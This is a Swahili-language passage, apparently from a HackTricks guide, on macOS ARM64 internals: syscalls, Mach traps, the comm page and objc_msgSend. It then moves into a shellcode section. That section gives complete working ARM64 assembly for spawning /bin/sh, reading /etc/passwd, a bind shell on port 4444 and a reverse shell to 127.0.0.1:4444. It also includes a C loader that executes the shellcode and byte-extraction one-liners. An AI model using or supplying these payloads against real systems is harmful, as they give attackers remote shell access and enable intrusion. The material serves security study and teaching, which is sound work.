Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) au endesha `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls zitakuwa na **x16 > 0**.

### Mach Traps

Katika [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html), angalia `mach_trap_table`, na katika [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h), angalia prototypes. Idadi ya juu ya Mach traps ni `MACH_TRAP_TABLE_COUNT` = 128. Mach traps zitakuwa na **x16 < 0**, kwa hiyo unahitaji kuita numbers kutoka kwenye list iliyotangulia kwa kutumia **minus**: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.

Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kujua jinsi ya kuita syscalls hizi (na BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note kwamba **Ida** na **Ghidra** pia zinaweza ku-decompile **specific dylibs** kutoka kwenye cache kwa kupitisha tu cache.

> [!TIP]
> Wakati mwingine ni rahisi zaidi kuangalia code ya **decompiled** kutoka kwa **`libsystem_kernel.dylib`** **kuliko** kuangalia **source code**, kwa sababu code ya baadhi ya syscalls (BSD na Mach) hutengenezwa kupitia scripts (angalia comments kwenye source code), ilhali kwenye dylib unaweza kuona kinachoitwa.

### machdep calls

XNU inasaidia aina nyingine ya calls zinazoitwa machine dependent. Nambari za calls hizi hutegemea architecture, na calls au nambari hizo hazihakikishwi kubaki zisizobadilika.

### comm page

Hili ni kernel-owned memory page ambalo lime-mapped kwenye address space ya kila user process. Limekusudiwa kufanya mpito kutoka user mode kwenda kernel space uwe wa haraka kuliko kutumia syscalls kwa kernel services zinazotumiwa sana kiasi kwamba mpito huu ungekuwa usiofaa sana.

Kwa mfano, call `gettimeofdate` husoma thamani ya `timeval` moja kwa moja kutoka kwenye comm page.

### objc_msgSend

Ni kawaida sana kupata function hii ikitumika katika programu za Objective-C au Swift. Function hii inaruhusu kuita method ya Objective-C object.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer ya instance
- x1: op -> Selector ya method
- x2... -> Arguments zilizosalia za method iliyoitwa

Kwa hiyo, ukiweka breakpoint kabla ya branch kwenda kwenye function hii, unaweza kupata kwa urahisi kinacho-invoked katika lldb (katika mfano huu object inaita object kutoka `NSConcreteTask` ambayo ita-run command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Kwa kuweka env variable **`NSObjCMessageLoggingEnabled=1`**, inawezekana ku-log wakati function hii inapoitwa kwenye file kama `/tmp/msgSends-pid`.
>
> Zaidi ya hayo, kwa kuweka **`OBJC_HELP=1`** na kuita binary yoyote, unaweza kuona environment variables nyingine unazoweza kutumia ku-**log** wakati actions fulani za Objc-C zinapotokea.

Wakati function hii inapoitwa, inahitajika kupata method iliyoitwa ya instance iliyoonyeshwa; kwa hili, searches tofauti hufanywa:

- Fanya optimistic cache lookup:
- Ikiwa imefanikiwa, imekamilika
- Pata runtimeLock (read)
- Ikiwa (realize && !cls->realized), realize class
- Ikiwa (initialize && !cls->initialized), initialize class
- Jaribu class own cache:
- Ikiwa imefanikiwa, imekamilika
- Jaribu class method list:
- Ikiwa imepatikana, jaza cache na ukamilishe
- Jaribu superclass cache:
- Ikiwa imefanikiwa, imekamilika
- Jaribu superclass method list:
- Ikiwa imepatikana, jaza cache na ukamilishe
- Ikiwa (resolver), jaribu method resolver, na urudie kutoka class lookup
- Ikiwa bado uko hapa (= kila kitu kingine kimeshindwa), jaribu forwarder

### Shellcodes

Ili ku-compile:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Ili kutoa bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Kwa macOS mpya zaidi:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Msimbo wa C wa kujaribu shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Imetolewa [**hapa**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) na imeelezwa.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Soma kwa cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo argumenti ya pili (x1) ni array ya params (ambayo kwenye memory inamaanisha stack ya anwani).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Tekeleza command kwa kutumia sh kutoka kwenye fork ili main process isiuawe
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) kwenye **port 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Kutoka [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell kwenda **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Marejeo

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
